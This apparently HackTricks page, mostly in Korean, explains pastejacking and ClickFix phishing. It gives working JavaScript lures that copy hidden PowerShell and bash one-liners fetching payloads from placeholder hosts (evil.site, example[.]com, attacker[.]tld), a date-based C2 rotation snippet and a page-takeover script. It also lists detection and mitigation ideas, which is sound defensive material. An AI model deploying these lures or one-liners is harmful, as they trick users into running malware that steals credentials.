# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래된 조언이지만 여전히 유효하다

## Overview

Clipboard hijacking – also known as *pastejacking* – 사용자가 명령을 자세히 확인하지 않고 습관적으로 복사·붙여넣기한다는 점을 악용한다. 악성 웹페이지(또는 JavaScript 실행이 가능한 Electron 또는 Desktop 애플리케이션과 같은 어떤 컨텍스트)는 공격자가 제어하는 텍스트를 프로그래밍적으로 시스템 클립보드에 넣는다. 피해자는 보통 정교한 사회공학적 지침으로 유도되어 **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell)를 누르거나 터미널을 열어 클립보드 내용을 *붙여넣기*하고 그 즉시 임의의 명령이 실행된다.

파일이 다운로드되지 않고 첨부파일이 열리지 않기 때문에, 이 기법은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회한다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader, Lumma Stealer와 같은 범용 멀웨어 계열을 배포하는 피싱 캠페인에서 널리 사용된다.

## Forced copy buttons and hidden payloads (macOS one-liners)

일부 macOS infostealer는 설치 사이트(예: Homebrew)를 복제하고 사용자가 보이는 텍스트만 선택하지 못하도록 **“Copy” 버튼 사용을 강제**한다. 클립보드 항목에는 예상되는 설치 명령과 뒤에 이어붙은 Base64 페이로드(예: `...; echo <b64> | base64 -d | sh`)가 포함되어 있어, 한 번의 붙여넣기로 둘 다 실행되며 UI는 추가 단계를 숨긴다.

## JavaScript 개념 증명 (PoC)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 캠페인들은 `document.execCommand('copy')`를 사용했고, 최신 캠페인들은 비동기 **Clipboard API** (`navigator.clipboard.writeText`)에 의존합니다.

## ClickFix / ClearFake 흐름

1. 사용자가 오타 도메인(typosquatted) 또는 탈취된 사이트(예: `docusign.sa[.]com`)에 방문합니다.
2. 주입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 클립보드에 Base64로 인코딩된 PowerShell 원라이너를 조용히 저장합니다.
3. HTML 지침은 피해자에게 다음을 지시합니다: *“Win + R 키를 누르고, 명령을 붙여넣은 뒤 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 합법적인 실행파일과 악성 DLL을 포함한 아카이브를 다운로드합니다(고전적인 DLL sideloading).
5. 로더는 추가 스테이지를 복호화하고, shellcode를 인젝션하며 persistence를 설치합니다(예: scheduled task) — 결국 NetSupport RAT / Latrodectus / Lumma Stealer가 실행됩니다.

### NetSupport RAT 체인 예시
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 자신의 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 해당 악성 DLL은 **GetProcAddress**로 API를 동적으로 해결하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드하며, 롤링 XOR 키 `"https://google.com/"`로 이를 복호화한 뒤 최종 shellcode를 주입하고 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt`를 다운로드함
2. **cscript.exe** 내부에서 JScript downloader를 실행함
3. **MSI payload**를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll`을 드롭함 → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출하며, `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성한 다음 `.a3x` 스크립트를 실행해 브라우저 자격 증명을 `sumeriavgv.digital`로 유출합니다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one‑liner를 붙여넣도록 지시한 뒤 이를 영구화(persist)하고 C2를 매일 회전시킵니다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
핵심 특성
- 피상적인 검사를 무력화하기 위해 실행(runtime) 시 역순으로 복원되는 난독화된 URL.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 지속성을 확보하고, 현재 날짜에 따라 C2를 선택하여 빠른 domain rotation을 가능하게 함.

날짜별로 C2s를 회전시키는 데 사용되는 Minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 persistence를 확립하고 RAT(예: PureHVNC)을 가져오는 loader를 배포하며, 종종 TLS를 하드코드된 certificate에 pinning하고 트래픽을 chunking합니다.

Detection ideas specific to this variant
- 프로세스 트리: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- 시작 항목 아티팩트: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`에 있는 LNK가 `%TEMP%`/`%APPDATA%` 하위의 JS 경로로 WScript/CScript를 호출함.
- Registry/RunMRU 및 명령줄 텔레메트리에 `.split('').reverse().join('')` 또는 `eval(a.responseText)` 포함.
- 긴 명령줄을 피하기 위해 큰 stdin 페이로드로 긴 스크립트를 공급하는 반복적인 `powershell -NoProfile -NonInteractive -Command -`.
- 이후에 LOLBins를 실행하는 Scheduled Tasks, 예: updater처럼 보이는 작업/경로(예: `\GoogleSystem\GoogleUpdater`) 아래에서 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` 같은 호출.

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴을 가진 일별 회전하는 C2 호스트네임 및 URL.
- clipboard write 이벤트 다음에 Win+R paste가 발생하고 즉시 `powershell.exe`가 실행되는 흐름을 상관관계 분석.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** 명령의 히스토리를 보관 — 비정상적인 Base64 / 난독화된 엔트리를 찾으세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe`이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }에 포함되는 경우.
* Event ID **4663**: 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더에서의 파일 생성 이벤트.
* EDR clipboard sensors(존재하는 경우) – `Clipboard Write` 직후 새로운 PowerShell 프로세스가 생성되는 것을 상관관계 분석.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 캠페인들은 가짜 CDN/browser verification 페이지("Just a moment…", IUAM-style)를 대량으로 생성하여 사용자가 자신의 clipboard에서 OS별 명령을 복사해 네이티브 콘솔로 붙여넣도록 유도합니다. 이것은 실행을 브라우저 샌드박스 밖으로 전환하며 Windows와 macOS 전반에서 동작합니다.

빌더가 생성한 페이지의 주요 특성
- `navigator.userAgent`를 통한 OS 탐지로 페이로드를 맞춤 (Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에는 착시 유지를 위해 선택적 decoys/no-ops 제공.
- 보이는 텍스트와 clipboard 내용이 다를 수 있는 상황에서 체크박스/Copy 같은 정상 UI 동작으로 자동 clipboard-copy 수행.
- 모바일 차단 및 단계별 안내가 있는 팝오버: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation과 단일 파일 injector로 손상된 사이트의 DOM을 Tailwind-styled verification UI로 덮어쓰기 (새 도메인 등록 불필요).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
초기 실행의 macOS persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하여 터미널이 닫힌 후에도 실행이 계속되도록 하여 눈에 띄는 흔적을 줄입니다.

손상된 사이트에서 In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Clipboard API를 verification widgets에 바인딩하는 페이지; 표시된 텍스트와 클립보드 페이로드의 불일치; `navigator.userAgent` 분기; 의심스러운 컨텍스트에서 Tailwind + single-page 교체.
- Windows endpoint: 브라우저 상호작용 직후 `explorer.exe` → `powershell.exe`/`cmd.exe` 실행; `%TEMP%`에서 실행된 batch/MSI 설치 프로그램.
- macOS endpoint: Terminal/iTerm이 브라우저 이벤트 근처에서 `nohup`과 함께 `bash`/`curl`/`base64 -d`를 실행; 터미널 종료 후에도 살아남는 백그라운드 작업.
- `RunMRU` Win+R 기록 및 클립보드 쓰기와 이후 콘솔 프로세스 생성 간의 상관관계 확인.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 완화 조치

1. 브라우저 강화 – 클립보드 쓰기 접근(`dom.events.asyncClipboard.clipboardItem` 등)을 비활성화하거나 사용자 제스처를 요구.
2. 보안 인식 교육 – 민감한 명령은 *직접 타이핑*하거나 먼저 텍스트 편집기에 붙여넣도록 교육.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control을 사용해 임의의 one-liners 차단.
4. 네트워크 제어 – 알려진 pastejacking 및 malware C2 도메인으로의 아웃바운드 요청 차단.

## 관련 트릭

* **Discord Invite Hijacking**은 사용자를 악성 서버로 유인한 뒤 동일한 ClickFix 접근을 악용하는 경우가 많다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 참고자료

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
